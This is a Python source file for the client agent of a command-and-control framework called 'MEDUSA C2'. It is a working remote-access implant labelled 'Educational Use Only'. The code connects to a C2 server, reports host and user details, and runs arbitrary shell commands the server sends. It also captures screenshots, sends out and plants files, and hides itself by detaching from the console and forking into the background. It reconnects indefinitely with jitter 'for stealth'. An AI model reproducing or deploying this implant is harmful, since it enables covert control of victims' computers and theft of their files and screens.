#!/usr/bin/env python3
"""
MEDUSA C2 Framework - Client Agent
Professional Command & Control Client
Educational Use Only - Developed for Cybersecurity Learning
"""

import os
import sys
import json
import uuid
import time
import base64
import socket
import random
import hashlib
import platform
import threading
import subprocess
import tempfile
import shutil
from datetime import datetime, timedelta

# Configuration - Persistent Connection Settings
SERVER_HOST = "127.0.0.1"  # Change to your C2 server IP
SERVER_PORT = 4444
CLIENT_ID = str(uuid.uuid4())
CHECKIN_INTERVAL = 30  # Check-in every 30 seconds for persistence
JITTER = 0.2  # 20% randomization for stealth
MAX_RECONNECT_ATTEMPTS = -1  # Infinite reconnection attempts for persistence
RECONNECT_DELAY = 30  # Base delay for exponential backoff
PERSISTENCE_MODE = True  # Enable advanced persistence features
STEALTH_MODE = True  # Enable stealth operation

# Global variables
running = True
connected = False

class SystemInfo:
    """System information collector"""
    @staticmethod
    def get_system_info():
        """Collect system information"""
        try:
            info = {
                'hostname': platform.node(),
                'username': os.environ.get('USERNAME', os.environ.get('USER', 'Unknown')),
                'os': f"{platform.system()} {platform.release()}",
                'arch': platform.machine(),
                'process_id': os.getpid(),
                'process_name': os.path.basename(sys.argv[0]),
                'python_version': platform.python_version(),
                'working_directory': os.getcwd(),
                'timestamp': datetime.now().isoformat()
            }
            return info
        except Exception as e:
            return {
                'hostname': 'Unknown',
                'username': 'Unknown', 
                'os': 'Unknown',
                'arch': 'Unknown',
                'process_id': 'Unknown',
                'process_name': 'Unknown',
                'error': str(e)
            }

class CommandExecutor:
    """Execute commands on the system"""
    # Track current working directory
    current_directory = os.getcwd()
    
    @staticmethod
    def execute_command(command):
        """Execute a system command"""
        try:
            # Handle directory changes properly
            if command.strip().lower().startswith('cd '):
                return CommandExecutor._handle_cd_command(command)
            
            # Handle pwd command for Windows
            if command.strip().lower() in ['pwd', 'cwd']:
                return {
                    'success': True,
                    'output': CommandExecutor.current_directory,
                    'return_code': 0
                }
            
            if platform.system() == 'Windows':
                # Windows command execution with proper encoding and working directory
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='utf-8',
                    errors='replace',
                    timeout=300,  # 5 minute timeout
                    cwd=CommandExecutor.current_directory,  # Use tracked directory
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
            else:
                # Unix/Linux command execution
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=300,  # 5 minute timeout
                    cwd=CommandExecutor.current_directory,  # Use tracked directory
                    executable='/bin/bash'
                )
            
            # Handle Windows command output properly - preserve exact formatting
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                if output:  # If there's already stdout, add a newline before stderr
                    output += "\n" + result.stderr
                else:
                    output = result.stderr
            
            # Ensure we have some output
            if not output.strip():
                output = "Command executed successfully (no output)"
            
            return {
                'success': result.returncode == 0,
                'output': output,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': 'Command timed out after 5 minutes',
                'return_code': -1
            }
        except Exception as e:
            return {
                'success': False,
                'output': f'Error executing command: {str(e)}',
                'return_code': -1
            }
    
    @staticmethod
    def _handle_cd_command(command):
        """Handle cd command with proper directory tracking"""
        try:
            # Parse the cd command
            parts = command.strip().split(' ', 1)
            if len(parts) == 1 or parts[1].strip() == '':
                # cd with no argument - go to home directory
                if platform.system() == 'Windows':
                    new_dir = os.environ.get('USERPROFILE', 'C:\\')
                else:
                    new_dir = os.environ.get('HOME', '/')
            else:
                target = parts[1].strip().strip('"\'')
                
                # Handle relative paths
                if os.path.isabs(target):
                    new_dir = target
                else:
                    new_dir = os.path.join(CommandExecutor.current_directory, target)
            
            # Normalize the path
            new_dir = os.path.normpath(new_dir)
            
            # Check if directory exists
            if os.path.exists(new_dir) and os.path.isdir(new_dir):
                # Update the tracked directory
                CommandExecutor.current_directory = new_dir
                return {
                    'success': True,
                    'output': f'Directory changed to: {new_dir}',
                    'return_code': 0
                }
            else:
                return {
                    'success': False,
                    'output': f'The system cannot find the path specified: {new_dir}',
                    'return_code': 1
                }
                
        except Exception as e:
            return {
                'success': False,
                'output': f'Error changing directory: {str(e)}',
                'return_code': 1
            }
    
    @staticmethod
    def take_screenshot():
        """Take a screenshot"""
        try:
            if platform.system() == 'Windows':
                # Windows screenshot using PowerShell
                ps_command = """
                Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
                $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
                $graphics = [Drawing.Graphics]::FromImage($bmp)
                $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                [Convert]::ToBase64String($ms.ToArray())
                """
                
                result = subprocess.run(
                    ['powershell', '-Command', ps_command],
                    capture_output=True,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
                
                if result.returncode == 0 and result.stdout.strip():
                    return {
                        'success': True,
                        'data': result.stdout.strip(),
                        'format': 'png'
                    }
                else:
                    return {
                        'success': False,
                        'error': 'Failed to capture screenshot via PowerShell'
                    }
            
            else:
                # Linux screenshot using scrot or import
                screenshot_tools = ['scrot', 'import']
                
                for tool in screenshot_tools:
                    try:
                        # Create temporary file
                        temp_file = tempfile.mktemp(suffix='.png')
                        
                        if tool == 'scrot':
                            subprocess.run([tool, temp_file], check=True, timeout=10)
                        elif tool == 'import':
                            subprocess.run([tool, '-window', 'root', temp_file], check=True, timeout=10)
                        
                        # Read and encode file
                        with open(temp_file, 'rb') as f:
                            screenshot_data = base64.b64encode(f.read()).decode()
                        
                        # Clean up
                        os.unlink(temp_file)
                        
                        return {
                            'success': True,
                            'data': screenshot_data,
                            'format': 'png'
                        }
                        
                    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                        continue
                
                return {
                    'success': False,
                    'error': 'No screenshot tools available (scrot, import)'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Screenshot error: {str(e)}'
            }
    
    @staticmethod
    def download_file(filepath):
        """Download a file from the system"""
        try:
            if not os.path.exists(filepath):
                return {
                    'success': False,
                    'error': f'File not found: {filepath}'
                }
            
            if not os.path.isfile(filepath):
                return {
                    'success': False,
                    'error': f'Path is not a file: {filepath}'
                }
            
            # Check file size (limit to 10MB)
            file_size = os.path.getsize(filepath)
            if file_size > 10 * 1024 * 1024:
                return {
                    'success': False,
                    'error': f'File too large: {file_size} bytes (max 10MB)'
                }
            
            # Read and encode file
            with open(filepath, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            return {
                'success': True,
                'filename': os.path.basename(filepath),
                'data': file_data,
                'size': file_size
            }
            
        except PermissionError:
            return {
                'success': False,
                'error': f'Permission denied: {filepath}'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Download error: {str(e)}'
            }
    
    @staticmethod
    def upload_file(filepath, data):
        """Upload a file to the system"""
        try:
            # Decode base64 data
            file_data = base64.b64decode(data)
            
            # Create directory if it doesn't exist
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            
            # Write file
            with open(filepath, 'wb') as f:
                f.write(file_data)
            
            return {
                'success': True,
                'filepath': filepath,
                'size': len(file_data)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Upload error: {str(e)}'
            }
    
    @staticmethod
    def browse_files(path):
        """Browse files in a directory"""
        try:
            if not os.path.exists(path):
                return {
                    'success': False,
                    'error': f'Path not found: {path}'
                }
            
            if not os.path.isdir(path):
                return {
                    'success': False,
                    'error': f'Path is not a directory: {path}'
                }
            
            # Get directory listing
            files = []
            try:
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    is_dir = os.path.isdir(item_path)
                    try:
                        size = 0 if is_dir else os.path.getsize(item_path)
                        modified = os.path.getmtime(item_path)
                        files.append({
                            'name': item,
                            'is_directory': is_dir,
                            'size': size,
                            'modified': modified
                        })
                    except (OSError, PermissionError):
                        # Skip files we can't access
                        continue
            except PermissionError:
                return {
                    'success': False,
                    'error': f'Permission denied: {path}'
                }
            
            return {
                'success': True,
                'output': json.dumps({'files': files, 'path': path})
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Browse error: {str(e)}'
            }
    
    @staticmethod
    def get_file_content(filepath):
        """Get file content for editing"""
        try:
            if not os.path.exists(filepath):
                return {
                    'success': False,
                    'error': f'File not found: {filepath}'
                }
            
            if not os.path.isfile(filepath):
                return {
                    'success': False,
                    'error': f'Path is not a file: {filepath}'
                }
            
            # Check file size (limit to 1MB for editing)
            file_size = os.path.getsize(filepath)
            if file_size > 1024 * 1024:
                return {
                    'success': False,
                    'error': f'File too large for editing: {file_size} bytes (max 1MB)'
                }
            
            # Read file content
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
            except UnicodeDecodeError:
                # Try with latin-1 encoding for binary files
                try:
                    with open(filepath, 'r', encoding='latin-1') as f:
                        content = f.read()
                except:
                    return {
                        'success': False,
                        'error': 'File contains binary data and cannot be edited'
                    }
            
            return {
                'success': True,
                'content': content
            }
            
        except PermissionError:
            return {
                'success': False,
                'error': f'Permission denied: {filepath}'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Read error: {str(e)}'
            }
    
    @staticmethod
    def save_file_content(filepath, content_b64):
        """Save file content from base64 encoded string"""
        try:
            # Decode base64 content
            content = base64.b64decode(content_b64).decode('utf-8')
            
            # Create directory if it doesn't exist
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            
            # Write file
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return {
                'success': True,
                'filepath': filepath
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Save error: {str(e)}'
            }

class BackgroundRunner:
    """Handle background execution"""
    @staticmethod
    def run_in_background():
        """Run the client in background"""
        try:
            if platform.system() == 'Windows':
                # Windows: Check if already running in background
                if '--background' not in sys.argv:
                    # Relaunch as background process
                    import subprocess
                    subprocess.Popen(
                        [sys.executable] + sys.argv + ['--background'],
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                        stdin=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        close_fds=True
                    )
                    sys.exit(0)
                else:
                    # Already backgrounded, hide console
                    try:
                        import ctypes
                        ctypes.windll.kernel32.FreeConsole()
                    except:
                        pass
            else:
                # Unix: Fork to background
                if '--background' not in sys.argv:
                    pid = os.fork()
                    if pid > 0:
                        sys.exit(0)  # Parent exits
                    
                    # Child continues
                    os.setsid()  # Become session leader
                    
                    # Fork again to prevent zombie
                    pid = os.fork()
                    if pid > 0:
                        sys.exit(0)
                    
                    # Redirect stdio
                    sys.stdin.close()
                    sys.stdout.close()
                    sys.stderr.close()
        except Exception as e:
            # If backgrounding fails, continue anyway
            pass

class C2Communication:
    """Handle communication with C2 server"""
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        
    def connect(self):
        """Connect to C2 server"""
        try:
            # Create socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Connect to server
            self.socket.connect((self.host, self.port))
            
            # Send handshake
            handshake = {
                'type': 'handshake',
                'client_id': CLIENT_ID,
                'timestamp': datetime.now().isoformat(),
                'system_info': SystemInfo.get_system_info()
            }
            
            message = json.dumps(handshake).encode()
            self.socket.send(len(message).to_bytes(4, byteorder='big'))
            self.socket.send(message)
            
            # Wait for acknowledgment
            ack_length = int.from_bytes(self.socket.recv(4), byteorder='big')
            ack_message = self.socket.recv(ack_length).decode()
            ack = json.loads(ack_message)
            
            if ack.get('type') == 'ack':
                self.connected = True
                return True
            
            return False
            
        except Exception as e:
            self.connected = False
            return False
    
    def disconnect(self):
        """Disconnect from server"""
        self.connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
    
    def send_message(self, message_type, data):
        """Send message to server"""
        try:
            if not self.connected:
                return False
            
            message = {
                'type': message_type,
                'client_id': CLIENT_ID,
                'timestamp': datetime.now().isoformat(),
                **data
            }
            
            encoded_message = json.dumps(message).encode()
            self.socket.send(len(encoded_message).to_bytes(4, byteorder='big'))
            self.socket.send(encoded_message)
            
            return True
            
        except Exception as e:
            self.connected = False
            return False
    
    def receive_message(self):
        """Receive message from server"""
        try:
            if not self.connected:
                return None
            
            # Receive message length
            length_bytes = self.socket.recv(4)
            if not length_bytes:
                return None
            
            message_length = int.from_bytes(length_bytes, byteorder='big')
            
            # Receive message
            message = b''
            while len(message) < message_length:
                chunk = self.socket.recv(message_length - len(message))
                if not chunk:
                    return None
                message += chunk
            
            return json.loads(message.decode())
            
        except Exception as e:
            self.connected = False
            return None

class HeartbeatThread(threading.Thread):
    """Send periodic heartbeats to server"""
    def __init__(self, communication):
        super().__init__()
        self.communication = communication
        self.daemon = True
        self.running = True
    
    def run(self):
        """Run heartbeat thread"""
        while self.running and running:
            try:
                if self.communication.connected:
                    # Send heartbeat
                    self.communication.send_message('heartbeat', {})
                    
                    # Calculate next heartbeat time with jitter
                    jitter = 1 + random.uniform(-JITTER, JITTER)
                    sleep_time = CHECKIN_INTERVAL * jitter
                    
                    # Sleep in small intervals to allow quick shutdown
                    for _ in range(int(sleep_time)):
                        if not self.running or not running:
                            break
                        time.sleep(1)
                else:
                    break
                    
            except Exception as e:
                self.running = False
                break
    
    def stop(self):
        """Stop heartbeat thread"""
        self.running = False

class CommandThread(threading.Thread):
    """Handle commands from server"""
    def __init__(self, communication):
        super().__init__()
        self.communication = communication
        self.daemon = True
        self.running = True
    
    def run(self):
        """Run command thread"""
        while self.running and running:
            try:
                if not self.communication.connected:
                    break
                
                # Receive command from server
                message = self.communication.receive_message()
                if not message:
                    break
                
                # Handle different message types
                msg_type = message.get('type')
                
                if msg_type == 'command':
                    self.handle_command(message)
                
            except Exception as e:
                break
        
        self.running = False
    
    def handle_command(self, message):
        """Handle command message"""
        try:
            command = message.get('data', '')
            task_id = message.get('task_id')  # Get task_id from message
            
            if not command:
                return
            
            # Handle special commands
            if command.lower() == 'screenshot':
                result = CommandExecutor.take_screenshot()
                if result.get('success'):
                    self.communication.send_message('screenshot', {
                        'task_id': task_id,
                        'data': result['data']
                    })
                else:
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': '',
                        'error': result.get('error', 'Screenshot failed')
                    })
            
            elif command.lower().startswith('download '):
                filepath = command[9:].strip()
                result = CommandExecutor.download_file(filepath)
                
                if result.get('success'):
                    self.communication.send_message('file_data', {
                        'task_id': task_id,
                        'filename': result['filename'],
                        'data': result['data']
                    })
                else:
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': '',
                        'error': result.get('error', 'Download failed')
                    })
            
            elif command.lower().startswith('upload '):
                # Upload format: upload <filepath> <base64_data>
                parts = command[7:].strip().split(' ', 1)
                if len(parts) == 2:
                    filepath, file_data = parts
                    result = CommandExecutor.upload_file(filepath, file_data)
                    
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': 'Upload successful' if result.get('success') else result.get('error', 'Upload failed'),
                        'error': '' if result.get('success') else result.get('error', 'Upload failed')
                    })
                else:
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': '',
                        'error': 'Invalid upload command format'
                    })
            
            elif command.lower().startswith('browse '):
                # Browse files in directory
                path = command[7:].strip()
                result = CommandExecutor.browse_files(path)
                
                self.communication.send_message('command_response', {
                    'task_id': task_id,
                    'output': result.get('output', ''),
                    'error': result.get('error', '') if not result.get('success') else ''
                })
                
            elif command.lower().startswith('get_content '):
                # Get file content for editing
                filepath = command[12:].strip()
                result = CommandExecutor.get_file_content(filepath)
                
                if result.get('success'):
                    self.communication.send_message('file_content', {
                        'task_id': task_id,
                        'filepath': filepath,
                        'content': result.get('content', '')
                    })
                else:
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': '',
                        'error': result.get('error', 'Failed to get file content')
                    })
                    
            elif command.lower().startswith('save_content '):
                # Save file content
                parts = command[13:].strip().split(' ', 1)
                if len(parts) == 2:
                    filepath, content_b64 = parts
                    result = CommandExecutor.save_file_content(filepath, content_b64)
                    
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': 'File saved successfully' if result.get('success') else result.get('error', 'Save failed'),
                        'error': '' if result.get('success') else result.get('error', 'Save failed')
                    })
                else:
                    self.communication.send_message('command_response', {
                        'task_id': task_id,
                        'output': '',
                        'error': 'Invalid save command format'
                    })
            
            else:
                # Regular command execution
                result = CommandExecutor.execute_command(command)
                
                self.communication.send_message('command_response', {
                    'task_id': task_id,
                    'output': result.get('output', ''),
                    'error': result.get('output', '') if not result.get('success') else ''
                })
                
        except Exception as e:
            # Send error response
            try:
                self.communication.send_message('command_response', {
                    'task_id': message.get('task_id'),
                    'output': '',
                    'error': f'Command handling error: {str(e)}'
                })
            except:
                pass
    
    def stop(self):
        """Stop command thread"""
        self.running = False

def main():
    """Main client function"""
    global running, connected
    
    # Run in background if not already backgrounded
    if '--background' not in sys.argv:
        BackgroundRunner.run_in_background()
        return 0
    
    attempt = 0
    
    while running:
        try:
            attempt += 1
            
            # Create communication object
            comm = C2Communication(SERVER_HOST, SERVER_PORT)
            
            # Try to connect
            if comm.connect():
                connected = True
                
                # Start heartbeat thread
                heartbeat = HeartbeatThread(comm)
                heartbeat.start()
                
                # Start command thread
                command_handler = CommandThread(comm)
                command_handler.start()
                
                # Wait for threads to finish
                command_handler.join()
                
                # Stop heartbeat
                heartbeat.stop()
                heartbeat.join(timeout=1)
                
                # Disconnect
                comm.disconnect()
                connected = False
            
            # If we reach here, connection was lost
            if running:
                # Wait before reconnecting
                wait_time = min(RECONNECT_DELAY * (2 ** min(attempt, 6)), 300)  # Exponential backoff, max 5 minutes
                time.sleep(wait_time)
            
        except KeyboardInterrupt:
            running = False
        except Exception as e:
            if running:
                time.sleep(RECONNECT_DELAY)
    
    return 0

if __name__ == "__main__":
    sys.exit(main())